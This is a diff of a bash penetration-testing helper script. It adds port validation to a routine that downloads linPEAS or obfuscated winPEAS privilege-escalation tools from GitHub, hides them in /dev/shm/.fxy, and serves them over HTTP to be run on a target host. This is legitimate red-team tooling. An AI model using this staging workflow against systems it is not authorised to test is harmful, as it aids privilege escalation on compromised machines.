@@ -10,27 +10,33 @@ if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
 fi
 
 if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
-  echo "${ques} Download *peas and serve via http.server?"; prompt
+  PORT="80"
+  if [ "$#" -eq 3 ]; then
+    if [[ "$3" =~ ^[0-9]+$ ]]; then # is it a number?
+      PORT="$3"
+    else
+      echo "${warn} Port is not a number!"; exit
+    fi
+  fi
+
+  echo "${ques} Download *peas and serve via http.server on port $PORT?"; prompt
 
   FPATH="/dev/shm/.fxy/peas"
   if [ ! -d "$FPATH" ]; then
     mkdir -p "$FPATH"
   fi
-  cd "$FPATH"
+  cd "$FPATH" || exit
 
+  URL1="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master"
+  URL2="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases"
   case "$2" in
-    "lin")       wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh" ;;
-    "winbat")    wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat' -O "$FPATH/winPEAS.bat" ;;
-    "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
-    "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
-    "win64")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O "$FPATH/winPEASx64.exe" ;;
+    "lin")       wget "$URL1/linPEAS/linpeas.sh" -O "$FPATH/linpeas.sh" ;;
+    "winbat")    wget "$URL1/winPEAS/winPEASbat/winPEAS.bat" -O "$FPATH/winPEAS.bat" ;;
+    "winany")    wget "$URL2/winPEASany.exe" -O "$FPATH/winPEASany.exe" ;;
+    "win86")     wget "$URL2/winPEASx86.exe" -O "$FPATH/winPEASx86.exe" ;;
+    "win64")     wget "$URL2/winPEASx64.exe" -O "$FPATH/winPEASx64.exe" ;;
     *)           echo "${warn} Error parsing PEAS version for download!"; exit ;;
   esac
-
-  PORT="80"
-  if [ "$#" -eq 3 ]; then
-    PORT="$3"
-  fi
 
   CMD="python3 -m http.server $PORT"
   echo "${info}${txtbld} Run this on your target:"
